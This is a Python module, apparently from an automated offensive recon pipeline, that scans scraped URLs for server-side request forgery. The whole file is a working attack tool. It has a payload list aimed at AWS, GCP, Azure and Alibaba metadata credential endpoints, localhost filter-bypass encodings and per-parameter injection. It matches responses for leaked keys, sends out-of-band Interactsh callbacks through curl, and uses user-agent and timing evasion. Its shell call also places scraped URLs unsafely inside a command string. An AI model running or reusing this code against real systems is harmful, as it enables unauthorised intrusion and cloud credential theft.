#!/usr/bin/env python3
# modules/step11_ssrf.py — SSRF Engine v6 (COMPLETE REWRITE)
# FIX: sed regex replaced with Python urllib.parse — injects into ALL params
#      not just URL-valued ones. Covers host=, path=, dest=, callback=, etc.
# MilkyWay Intelligence | Author: Sharlix

import os
import re
import time
import urllib.request
import urllib.parse
import urllib.error
import threading
from core.utils import count_lines, safe_read

# Cloud metadata endpoints — most impactful SSRF targets
SSRF_PAYLOADS = [
    # AWS IMDSv1
    ("http://169.254.169.254/latest/meta-data/", "AWS_META"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS_IAM"),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP_META"),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "AZURE_META"),
    # Alibaba
    ("http://100.100.100.200/latest/meta-data/", "ALIBABA_META"),
    # Internal
    ("http://127.0.0.1/", "LOCALHOST"),
    ("http://localhost/", "LOCALHOST"),
    ("http://0.0.0.0/", "LOCALHOST"),
    # Bypass encodings
    ("http://0177.0.0.1/", "OCTAL_BYPASS"),
    ("http://2130706433/", "INT_BYPASS"),
    ("http://0x7f000001/", "HEX_BYPASS"),
    ("http://127.1/", "SHORT_BYPASS"),
]

# AWS metadata response indicators (confirmed patterns)
AWS_INDICATORS    = ["ami-id","instance-id","local-ipv4","security-credentials",
                     "AccessKeyId","SecretAccessKey","Token","iam"]
GCP_INDICATORS    = ["computeMetadata","service-accounts","token_uri","project-id"]
AZURE_INDICATORS  = ["subscriptionId","resourceGroupName","vmId"]

# HTTP parameters commonly vulnerable to SSRF
SSRF_PARAM_NAMES = {
    "url","uri","link","src","source","dest","destination","redirect","return",
    "next","goto","target","path","file","host","domain","proxy","callback",
    "fetch","load","request","req","site","page","data","img","image","feed",
    "to","from","ref","origin","location","forward","endpoint","api","webhook",
    "u","r","l","q","s","p","resource","address","server","service"
}


def _get_live_hosts(p, limit=100):
    """Returns live hosts - ALWAYS includes main target as fallback."""
    tgt = p.target.strip()
    if not tgt.startswith("http"):
        tgt = "https://" + tgt

    hosts = []
    seen  = set()

    for key in ("fmt_url", "live_hosts", "resolved"):
        src = p.files.get(key, "")
        if not src or not os.path.isfile(src):
            continue
        from core.utils import safe_read
        for line in safe_read(src):
            line = line.strip()
            if not line:
                continue
            if not line.startswith("http"):
                line = "https://" + line
            if line not in seen:
                seen.add(line)
                hosts.append(line)
        if hosts:
            break

    # GUARANTEED: always include main target
    if tgt not in seen:
        hosts.insert(0, tgt)

    return hosts[:limit]


class SSRFStep:
    def __init__(self, p):
        self.p   = p
        self.log = p.log
        self.f   = p.files
        self._lock = threading.Lock()

    def run(self):
        urls     = self.f["urls"]
        ssrf_out = self.f["ssrf_params"]

        # Step 1: gf filter
        self.p.shell(f"cat {urls} 2>/dev/null | gf ssrf > {ssrf_out} 2>/dev/null",
                     label="gf ssrf filter")

        # Step 2: python-based additional param extraction
        self._extract_ssrf_params(urls, ssrf_out)

        n = count_lines(ssrf_out)
        if n == 0:
            self.log.warn("No SSRF params found"); return

        self.log.info(f"  ↳ SSRF candidates: {n}")
        probe_out = os.path.join(self.p.out, f"{self.p.prefix}_ssrf_probe.txt")
        found = 0

        # Step 3: Python urllib-based injection (replaces broken sed)
        targets = safe_read(ssrf_out)[:300]
        for url in targets:
            found += self._test_ssrf_url(url, probe_out)
            self.p.bypass.jitter()

        # Step 4: OOB blind SSRF
        if self.p.oob:
            self._blind_ssrf_oob(ssrf_out, probe_out)

        self.log.success(f"SSRF: {found} potential findings")

    def _extract_ssrf_params(self, urls_file: str, out_file: str):
        """
        FIX: Extract URLs with SSRF-prone parameter names — regardless of value type.
        Old sed approach only found params with URL values (=http://...).
        This finds: ?host=server, ?path=/api, ?dest=something, etc.
        """
        if not os.path.isfile(urls_file):
            return
        added = 0
        with open(urls_file) as f:
            lines = [l.strip() for l in f if l.strip()]

        with open(out_file, 'a') as out:
            for url in lines:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                    for param in qs:
                        if param.lower() in SSRF_PARAM_NAMES:
                            if url + "\n" not in open(out_file).read() if os.path.isfile(out_file) else True:
                                out.write(url + "\n")
                                added += 1
                                break
                except Exception as _e:
                    from core.error_handler import get_handler
                    get_handler().capture("step11_ssrf", _e)

        if added > 0:
            # Deduplicate
            self.p.shell(f"sort -u {out_file} -o {out_file} 2>/dev/null")
            self.log.info(f"  ↳ Added {added} SSRF-prone param URLs (Python extraction)")

    def _test_ssrf_url(self, url: str, probe_out: str) -> int:
        """
        FIX: Python-based param injection — replaces broken sed.
        Injects payload into EACH parameter individually.
        Returns count of confirmed/potential findings.
        """
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs:
                return 0
        except Exception:
            return 0

        # Get baseline
        baseline_resp = self._fetch(url, timeout=6)
        baseline_len  = len(baseline_resp.get("body","")) if baseline_resp else 0

        found = 0
        for param_key in list(qs.keys())[:5]:  # max 5 params per URL
            for payload, payload_name in SSRF_PAYLOADS[:8]:  # top 8 payloads
                # Inject only into this param, keep others as-is
                test_qs = dict(qs)
                test_qs[param_key] = [payload]
                new_query = urllib.parse.urlencode(test_qs, doseq=True)
                test_url  = urllib.parse.urlunparse(
                    parsed._replace(query=new_query))

                resp = self._fetch(test_url, timeout=8)
                if not resp:
                    continue

                body    = resp.get("body","")
                signals = self._analyze_response(body, baseline_len, resp)

                if signals:
                    severity = "critical" if any("AWS" in s or "GCP" in s or "AZURE" in s
                                                  for s in signals) else "high"
                    detail = f"param={param_key} payload={payload_name} | {' | '.join(signals[:2])}"
                    line = f"SSRF [{payload_name}]: {test_url} | {detail}"
                    with self._lock:
                        with open(probe_out, "a") as pf:
                            pf.write(line + "\n")
                    self.p.add_finding(severity, f"SSRF_{payload_name}", test_url,
                                       detail, "ssrf-engine", response=body,
                                       baseline_len=baseline_len)
                    found += 1
                    break  # Found for this param, move to next

        return found

    def _analyze_response(self, body: str, baseline_len: int, resp: dict) -> list:
        """Multi-signal SSRF confirmation."""
        signals = []
        body_lower = body.lower()

        # Signal 1: Cloud metadata keywords (HIGH CONFIDENCE)
        for kw in AWS_INDICATORS:
            if kw.lower() in body_lower:
                signals.append(f"AWS metadata: {kw}")
                return signals  # Immediate confirm

        for kw in GCP_INDICATORS:
            if kw.lower() in body_lower:
                signals.append(f"GCP metadata: {kw}")
                return signals

        for kw in AZURE_INDICATORS:
            if kw.lower() in body_lower:
                signals.append(f"Azure metadata: {kw}")
                return signals

        # Signal 2: Internal IP in response
        if re.search(r'(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.|127\.)\d+\.\d+', body):
            signals.append("internal IP in response")

        # Signal 3: Large content diff vs baseline
        diff = abs(len(body) - baseline_len)
        if diff > 500 and baseline_len > 0:
            signals.append(f"content diff +{diff}b")

        # Signal 4: Response delay (blind SSRF indicator)
        if resp.get("elapsed", 0) > 6:
            signals.append(f"delay {resp['elapsed']:.1f}s")

        # Signal 5: Status change (baseline probably 200, now 200 with different body)
        if resp.get("status") == 200 and baseline_len > 0 and diff > 200:
            signals.append("response body changed on payload injection")

        # Need at least 2 signals for potential (reduce FPs)
        return signals if len(signals) >= 2 else []

    def _fetch(self, url: str, timeout: int = 8) -> dict:
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": self.p.bypass.ua(),
                "Accept"    : "*/*",
                "Connection": "close",
            })
            start = time.time()
            resp  = urllib.request.urlopen(req, timeout=timeout)
            elapsed = time.time() - start
            body  = resp.read(15000).decode("utf-8", errors="ignore")
            return {"status": resp.status, "body": body, "elapsed": round(elapsed, 2)}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": "", "elapsed": 0}
        except Exception:
            return None

    def _blind_ssrf_oob(self, params_file: str, probe_out: str):
        """OOB blind SSRF via Interactsh — injects into ALL SSRF-prone params."""
        params = safe_read(params_file)[:30]
        injected = 0
        for url in params:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                for param_key in list(qs.keys())[:3]:
                    if param_key.lower() not in SSRF_PARAM_NAMES:
                        continue
                    oob_url  = self.p.oob.get_payload("ssrf", url)
                    test_qs  = dict(qs)
                    test_qs[param_key] = [oob_url]
                    new_query = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url  = urllib.parse.urlunparse(parsed._replace(query=new_query))
                    self.p.shell(
                        f"curl -sk --connect-timeout 8 --max-time 10 '{test_url}' > /dev/null 2>&1")
                    injected += 1
            except Exception as _e:
                from core.error_handler import get_handler
                get_handler().capture("step11_ssrf", _e)

        self.log.info(f"OOB SSRF: {injected} payloads injected → check Interactsh")
